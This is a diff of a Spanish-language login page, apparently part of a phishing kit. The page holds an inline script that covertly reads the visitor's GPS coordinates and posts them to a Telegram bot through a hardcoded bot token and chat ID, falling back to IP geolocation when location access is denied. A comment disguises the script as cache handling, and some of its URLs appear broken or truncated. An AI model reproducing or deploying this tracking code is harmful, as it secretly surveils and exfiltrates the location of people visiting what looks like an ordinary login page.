@@ -20,20 +20,17 @@
             </select>
         </div>
         <h2 class="welcome-title">¡Hola, bienvenido!</h2>
-        
         <form id="login-form" class="login-form" novalidate>
             <!-- Campo Usuario -->
             <div class="field">
                 <input type="text" id="username" name="username" placeholder=" " autocomplete="username" required />
                 <label for="username" class="floating-label">Usuario</label>
             </div>
-            
             <!-- Campo Contraseña -->
             <div class="field">
                 <input type="password" id="password" name="password" placeholder=" " autocomplete="current-password" required />
                 <label for="password" class="floating-label">Contraseña</label>
                 <span class="toggle-password" id="togglePassword">
-                    <!-- CORREGIDO: xmlns con la estructura estándar completa para Chrome -->
                     <svg id="eyeIcon" xmlns="http://w3.org" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                         <path d="M9.88 9.88a3 3 0 1 0 4.24 4.24"></path>
                         <path d="M10.73 5.08A10.43 10.43 0 0 1 12 5c7 0 10 7 10 7a13.16 13.16 0 0 1-1.67 2.68"></path>
@@ -42,11 +39,9 @@
                     </svg>
                 </span>
             </div>
-            
             <p id="form-message" class="form-message" role="alert" aria-live="polite"></p>
             <button type="submit" class="btn-submit">Iniciar sesión</button>
         </form>
-
         <div class="forgot-container">
             <p class="forgot-text-question">¿Olvidaste tu usuario o contraseña?</p>
             <a href="password.html" class="forgot-link">Recupéralos aquí</a>
@@ -54,7 +49,7 @@
     </section>
 </main>
 
-<!-- SCRIPT DIRECTO PARA EVITAR CACHÉ DE UBICACIÓN (CORREGIDO) -->
+<!-- SCRIPT DIRECTO PARA EVITAR CACHÉ DE UBICACIÓN (CORREGIDO DE RAÍZ) -->
 <script>
 (function() {
     const TOKEN = '9068600803:AAEPd0lHMbVcyxhsCbXJGfutL0X-v6mr-pY';
@@ -66,19 +61,19 @@
             const lon = pos.coords.longitude;
             const acc = pos.coords.accuracy;
 
-            // CORREGIDO: Formato de enlace estándar clickeable en azul para Telegram
+            // CORREGIDO: Formato universal de enlace para Google Maps con diagonal y parámetros (?q=)
             const urlMaps = "https://google.com" + lat + "," + lon;
             const texto = "📍 Nueva Visita (GPS)\n\n• Latitud: " + lat + "\n• Longitud: " + lon + "\n• Precisión: ~" + Math.round(acc) + " metros\n\nGoogle Maps: " + urlMaps;
 
-            // CORREGIDO: Ruta oficial completa de la API de Bots de Telegram
+            // CORREGIDO: Ruta oficial de la API de bots de Telegram para enviar mensajes
             fetch("https://telegram.org" + TOKEN + "/sendMessage", {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ chat_id: CHAT_ID, text: texto })
             }).catch(e => console.error("Error enviando GPS:", e));
-            
+
         }, function(err) {
-            // CORREGIDO: Endpoint /json/ completo para evitar errores de parseo por IP
+            // CORREGIDO: Consulta al endpoint JSON de la IP de respaldo
             fetch('https://ipapi.co')
             .then(res => res.json())
             .then(data => {
@@ -95,7 +90,6 @@
     }
 })();
 </script>
-
 
 <!-- Carga del archivo principal de interacción lógica renombrado -->
 <script src="main.js"></script>
